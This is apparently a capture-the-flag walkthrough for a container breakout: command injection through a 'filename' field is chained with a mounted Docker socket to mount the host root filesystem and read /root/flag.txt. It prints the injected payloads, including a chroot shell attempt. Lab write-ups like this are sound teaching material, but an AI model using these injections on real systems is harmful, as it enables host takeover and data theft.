# Container Breakout Walkthrough

You find the portal and the first thing you try is to display the content of the "flag.txt" file, with no luck:  
![firsttry](./images/first_try.png)  

maybe you are able to pipe commands and excape the file content display functionality:  
![rce](./images/rce.png)  

The application is vulnerable to RCE!  

Try to display the content of the Dockerfile:  
![dockerfile](./images/docker_sock.png)  

The docker sock is mounted inside the container, you can leverage this!  

Check if docker is available inside the container:  
![docker_version](./images/docker_version.png)  

It is!  
So you know that the docker sock is mounted inside the container and you have the docker cli, let's try to start a new container:  
```sh
filename: ; docker run -v /:/mnt --rm -it busybox chroot /mnt sh
```  
Unfortunately you cannot open a shell:  
![tty](./images/tty.png)  

You need to do a bit of manual enumeration:  
```sh
filename: ; docker run -v /:/mnt --rm busybox ls -lah /mnt/root/
```  
![file](./images/found_flag_file.png)  


At this point you can read that file content:  
```sh
filename: ; docker run -v /:/mnt --rm busybox cat /mnt/root/flag.txt
```  

![flag](./images/flag.png)  

Congrats! You found the flag! 🎉 🏴  






